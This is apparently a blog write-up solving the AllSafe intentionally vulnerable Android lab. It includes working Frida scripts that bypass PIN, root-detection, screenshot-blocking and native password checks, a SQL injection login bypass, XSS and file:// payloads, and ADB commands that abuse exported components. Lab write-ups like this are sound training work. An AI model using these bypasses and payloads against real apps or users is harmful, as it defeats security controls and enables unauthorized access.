---
title: "Android AllSafe App: Comprehensive Penetration Testing Writeup"
date: 2026-01-08 16:00:00 +0200
categories: [Mobile Security, Android, Penetration Testing, Vulnerable Lab]
tags: [android, apk, frida, pentesting, vulnerabilities, security, deeplink, jwt, sqlite, vuln-lab, allsafe]
---

# Android AllSafe App: Comprehensive Penetration Testing Writeup

A detailed walkthrough of common Android security vulnerabilities found in the **AllSafe** vulnerable application, including exploitation techniques and bypass methods using Frida, ADB, and manual code analysis.

---

## 1. Insecure Logging

The application logs sensitive user input without proper security controls.

**Discovery Method:**
```powershell
emu64xa:/ # pidof infosecadventures.allsafe
3370
```

**Exploitation:**
```powershell
adb shell 'logcat --pid 3370 | grep secret'
```

**Results:**
```
10-12 15:38:46.521  3370  3370 D ALLSAFE : User entered secret: test
10-12 15:54:52.155  3370  3370 D ALLSAFE : User entered secret: this is not secure for any sensitive data
```

**Impact:** Sensitive data (passwords, tokens, API keys) exposed in system logs.

---

## 2. Hardcoded Credentials

### SOAP Credentials
```java
public static final String BODY = "\n            <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n            <soap:Header>\n                 <UsernameToken xmlns=\"http://siebel.com/webservices\">superadmin</UsernameToken>\n                 <PasswordText xmlns=\"http://siebel.com/webservices\">supersecurepassword</PasswordText>\n                 <SessionType xmlns=\"http://siebel.com/webservices\">None</SessionType>\n            </soap:Header>\n        ";
```

**Credentials Found:**
- Username: `superadmin`
- Password: `supersecurepassword`

### Development Environment Credentials (strings.xml)
```xml
<string name="dev_env">https://admin:password123@dev.infosecadventures.com</string>
```

**Credentials Found:**
- Username: `admin`
- Password: `password123`

---

## 3. Firebase Database Misconfiguration

### Vulnerable Firebase URL
```xml
<string name="firebase_database_url">https://allsafe-8cef0.firebaseio.com</string>
```

### Exploitation
Accessing the REST API endpoint:
```powershell
https://allsafe-8cef0.firebaseio.com/.json
```

### Response
```json
{
  "flag": "5077e90341de49d0ed79b8ee53572dab",
  "secret": "A bug is never just a mistake. It represents something bigger. An error of thinking. That makes you who you are."
}
```

### Why Adding `.json` Exposes Data?

Firebase Realtime Database uses REST API. Accessing `https://<project>.firebaseio.com/.json` returns the complete JSON tree (or a portion of it) **if** the database rules allow public read access.

Adding `.json` is the standard REST method for reading Firebase data. If rules are set to `read: true` for everyone, the database is publicly accessible without authentication.

---

## 4. Insecure SharedPreferences

User credentials stored in plaintext SharedPreferences:

```powershell
emu64xa:/ # cat /data/data/infosecadventures.allsafe/shared_prefs/user.xml

<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">1234</string>
    <string name="username">ahmed</string>
</map>
```

**Findings:**
- Username: `ahmed`
- Password: `1234`

---

## 5. SQL Injection

The app is vulnerable to basic SQL injection in the login form.

**PoC:**
```
Username: admin'or 1=1--
Password: 1234
```

Result: Authentication bypass

---

## 6. PIN Bypass using Frida

### Source Code Analysis
```java
private final boolean checkPin(String pin) {
    byte[] bArrDecode = Base64.decode("NDg2Mw==", 0);
    Intrinsics.checkNotNullExpressionValue(bArrDecode, "decode(...)");
    return Intrinsics.areEqual(pin, new String(bArrDecode, Charsets.UTF_8));
}
```

**PIN Code:** `NDg2Mw==` (Base64) → `4863` (decoded)

### Frida Bypass Script
```javascript
// pinBypass-robust-frida.js
Java.perform(function () {
    function safeLog(s) {
        console.log("[frida] " + s);
    }

    function tryHookDirect() {
        try {
            var PinBypass = Java.use('infosecadventures.allsafe.challenges.PinBypass');
            try {
                PinBypass.checkPin.overload('java.lang.String').implementation = function(pin) {
                    safeLog("direct: PinBypass.checkPin called with -> " + pin);
                    return true; // force success
                };
                safeLog("direct: Hooked PinBypass.checkPin(String) -> returns true");
                return true;
            } catch (e) {
                try {
                    PinBypass.checkPin.implementation = function(pin) {
                        safeLog("direct(no-overload): PinBypass.checkPin called with -> " + pin);
                        return true;
                    };
                    safeLog("direct: Hooked PinBypass.checkPin (no overload) -> returns true");
                    return true;
                } catch (e2) {
                    safeLog("direct hook failed: " + e2);
                }
            }
        } catch (err) {
            safeLog("direct: PinBypass class not available yet (" + err + ")");
        }
        return false;
    }

    var attempts = 0;
    function attemptAll() {
        attempts++;
        safeLog("attempt #" + attempts + " to hook targets...");
        var ok = tryHookDirect();
        if (ok) {
            safeLog("one or more hooks installed. done.");
        } else {
            if (attempts < 10) {
                setTimeout(attemptAll, 500);
            } else {
                safeLog("gave up after " + attempts + " attempts.");
            }
        }
    }

    setTimeout(attemptAll, 100);
});
```

---

## 7. Root Detection Bypass

### Manifest Declaration
```xml
<activity android:name="infosecadventures.allsafe.challenges.RootBare" ... />
```

### Frida Bypass Script
```javascript
// rootbypass-frida.js
Java.perform(function () {
    var logTag = "[frida-rootbypass]";
    function safeLog(msg) { console.log(logTag + " " + msg); }

    var suspiciousBinaries = ["su", "magisk", "busybox"];

    function safe(fn) {
        try { return fn(); } catch (e) { safeLog("Exception: " + e); return null; }
    }

    // Hook RootBeer.isRooted() -> always false
    safe(function() {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {
            safeLog("Hooked RootBeer.isRooted() -> returning false");
            return false;
        };
        safeLog("Hook installed: RootBeer.isRooted()");
    });

    // Hook checkForBinary via java.io.File.exists()
    safe(function() {
        var File = Java.use('java.io.File');
        var File_exists = File.exists;
        File.exists.implementation = function() {
            try {
                var path = this.getAbsolutePath();
                for (var i = 0; i < suspiciousBinaries.length; i++) {
                    var bin = suspiciousBinaries[i];
                    if (path.indexOf(bin) !== -1) {
                        safeLog("File.exists() intercepted for path: " + path + " -> returning false");
                        return false;
                    }
                }
            } catch (ex) {
                safeLog("File.exists hook inner exception: " + ex);
            }
            return File_exists.call(this);
        };
        safeLog("Hook installed: java.io.File.exists");
    });

    // Hook other detection methods
    safe(function() {
        var RB = Java.use('com.scottyab.rootbeer.RootBeer');
        if (RB.checkSuExists) {
            RB.checkSuExists.implementation = function() {
                safeLog("Hooked RootBeer.checkSuExists() -> returning false");
                return false;
            };
        }
        if (RB.detectTestKeys) {
            RB.detectTestKeys.implementation = function() {
                safeLog("Hooked RootBeer.detectTestKeys() -> returning false");
                return false;
            };
        }
    });

    safeLog("rootbypass-frida: initial hook attempts complete");
});
```

**Result:** `Congrats, root is not detected!`

---

## 8. SecureFlag Bypass (Screenshot Prevention)

The app uses `FLAG_SECURE` to prevent screenshots. This can be bypassed:

```javascript
// secureflag-bypass-frida.js
Java.perform(function () {
    var Window = Java.use("android.view.Window");

    Window.setFlags.implementation = function (flags, mask) {
        if (mask == 0x2000) { // 0x2000 = FLAG_SECURE
            console.log("[Bypass] FLAG_SECURE detected! Blocking it...");
            return this.setFlags(0, 0);
        }
        return this.setFlags(flags, mask);
    };

    console.log("[+] Secure Flag Bypass script injected successfully!");
});
```

**Captured UI Text:**
```
My password is: Il0v3fr1d4. Can you screenshot this? The MainActivity is using the secure window flag, 
which prevents showing sensitive data in screenshots. It's just a fun Frida practice!
```

---

## 9. Deep Linking

The app exposes a Deep Link activity:

```xml
<activity
    android:name="infosecadventures.allsafe.challenges.DeepLinkTask"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="allsafe"
            android:host="infosecadventures"
            android:pathPrefix="/congrats"/>
    </intent-filter>
</activity>
```

### Exploitation
The app requires a `key` parameter. Found in strings.xml:
```xml
Key: ebfb7ff0-b2f6-41c8-bef3-4fba17be410c
```

**PoC Command:**
```powershell
adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

---

## 10. Insecure Broadcast Receiver

### Manifest Declaration
```xml
<receiver
    android:name="infosecadventures.allsafe.challenges.NoteReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="infosecadventures.allsafe.action.PROCESS_NOTE"/>
    </intent-filter>
</receiver>
```

### Exploitation
```powershell
adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE \
  --es server "hello" \
  --es note "Hacked" \
  --es notification_message "Hacked" \
  -n infosecadventures.allsafe/infosecadventures.allsafe.challenges.NoteReceiver
```

---

## 11. WebView Vulnerabilities

### Dangerous Configuration
```java
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);
```

### LFI (Local File Inclusion)
**Payload:**
```
file:///etc/hosts
```

### XSS (Cross-Site Scripting)
**Payloads:**
```javascript
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
```

---

## 12. Weak Cryptography

### Hardcoded AES Key
```java
KEY = "1nf053c4dv3n7ur3"
```

### Weak PRNG
```java
public static String randomNumber() {
    Random rnd = new Random();
    int n = rnd.nextInt(100000) + 1;
    return Integer.toString(n);
}
```

### Weak Hash Function
```java
MessageDigest digest = MessageDigest.getInstance("MD5");
```

### Frida Intercept
```powershell
frida -U -l android_crypto_inter.js -f infosecadventures.allsafe
```

**Output:**
```
[+] onEnter: secretKeySpec.init
  --> Key String: 1nf053c4dv3n7ur3
  --> Algorithm: AES

[+] onEnter: cipher.getInstance
  --> Algorithm: AES/ECB/PKCS5PADDING

[+] onEnter: cipher.doFinal
  --> Input String: test
  --> Output Base64: 8U96O0cayXe8EmZZECqNcQ==

[+] onEnter: messageDigest.getInstance
  --> Algorithm: MD5

[+] onEnter: messageDigest.digest
  --> Input String: ahmed
  --> Output Base64: kZPOOzEzKwP32K8FbGkrhA==
```

---

## 13. Insecure Service

### Manifest Declaration
```xml
<service
    android:name="infosecadventures.allsafe.challenges.RecorderService"
    android:enabled="true"
    android:exported="true"/>
```

### Exploitation
```powershell
adb shell am startservice infosecadventures.allsafe/infosecadventures.allsafe.challenges.RecorderService
```

---

## 14. Object Serialization

Vulnerable code:
```java
final String path = requireActivity().getExternalFilesDir(null) + "/user.dat";

if (!user.role.equals("ROLE_EDITOR")) {
    SnackUtil.INSTANCE.simpleMessage(requireActivity(), "Sorry, only editors have access!");
} else {
    SnackUtil.INSTANCE.simpleMessage(requireActivity(), "Good job!");
    Toast.makeText(requireContext(), user.toString(), 0).show();
}
```

**Risk:** Serialized objects can be tampered with to escalate privileges.

---

## 15. Insecure Content Providers

### Manifest Declaration
```xml
<provider
    android:name="infosecadventures.allsafe.challenges.DataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="infosecadventures.allsafe.dataprovider"/>
```

### Exploitation via ADB
```powershell
adb shell content query --uri "content://infosecadventures.allsafe.dataprovider"
```

**Output:**
```
Row: 0 id=1, user=admin, note=I can not believe that Jill is still using 123456 as her password...
Row: 1 id=2, user=elliot.alderson, note=A bug is never just a mistake. It represents something bigger...
Row: 2 id=3, user=darlene.alderson, note=That's the trick about money. Banks care more about it...
Row: 3 id=4, user=gideon.goddard, note=You're never sure about anything unless...
```

### Manual SQLite Access
```powershell
emu64xa:/data/data/infosecadventures.allsafe/databases # sqlite3 notes.db
sqlite> SELECT * FROM notes;
```

---

## 16. JWT Token Extraction & Tampering

### File Location
```
/data/data/infosecadventures.allsafe/files/docs/readme.txt
```

### Extraction (Base64 Encoded)
After decoding:
```
---------------------
LEAVE ME HERE
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW5pc3RyYXRvciIsIm5hbWUiOiJlbGxpb3QuYWxkZXJzb24iLCJzZWNyZXQiOiJXZWxsIGRvbmUhIiwiaWF0IjoxNjE1NzkzNTg3fQ.X8dEuYowT5OmwC4If-Zm0sbu4WiWr-kHrQj9DoUE9T8
---------------------
```

### Decoded JWT (jwt.io)
```json
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "role": "administrator",
  "name": "elliot.alderson",
  "secret": "Well done!",
  "iat": 1615793587
}
```

---

## 17. Native Library Bypass

Using Frida to override native method:

```javascript
// override_checkPassword.js
Java.perform(function () {
    var NL = Java.use('infosecadventures.allsafe.challenges.NativeLibrary');

    NL.checkPassword.implementation = function (password) {
        try {
            console.log("[frida] checkPassword called with:", password ? password.toString() : "<null>");
        } catch (e) { console.log("[frida] error printing password: " + e); }

        // Bypass: always return true
        return true;
    };

    console.log("[frida] Java-level override installed for NativeLibrary.checkPassword()");
});
```

---

## 18. SMALI Code Patching

Reverse the firewall check logic using APKTool.

**Original Code:**
```smali
if-eqz v0, :cond_0
```

**Patched Code:**
```smali
if-nez v0, :cond_0
```

This inverts the condition, making the "firewall activated" branch execute even when the firewall is down.

---

## Key Takeaways

1. **Never log sensitive data** to system logs
2. **Never hardcode credentials** in source code or resources
3. **Secure database configurations** (Firebase, SQLite, SharedPreferences)
4. **Use parameterized queries** to prevent SQL injection
5. **Implement proper PIN/authentication logic** (not easily bypassable)
6. **Verify root/jailbreak detection** is robust
7. **Use FLAG_SECURE** carefully, but don't rely solely on it
8. **Validate deep links** and validate parameters
9. **Restrict Broadcast Receivers** and other exported components
10. **Disable dangerous WebView settings** (JavaScript, file access)
11. **Use strong cryptography** (AES-256, SHA-256, etc.)
12. **Encrypt sensitive data** in storage
13. **Restrict Content Provider access** with proper permissions
14. **Use JWT best practices** (strong secrets, proper validation)
15. **Protect native code** with obfuscation and anti-tampering measures
16. **Don't rely on SMALI patching prevention** alone

---

## Tools Used

- **ADB** (Android Debug Bridge)
- **Frida** (Dynamic Instrumentation)
- **APKTool** (APK Decompilation)
- **Jadx/Apktool** (Source Code Analysis)
- **SQLite3** (Database Access)
- **jwt.io** (JWT Decoding)
- **CyberChef** (Data Encoding/Decoding)

---

**References:**
- AllSafe Vulnerable Android App
- OWASP Mobile Security Testing Guide
- Frida Documentation
- Android Security & Privacy Documentation
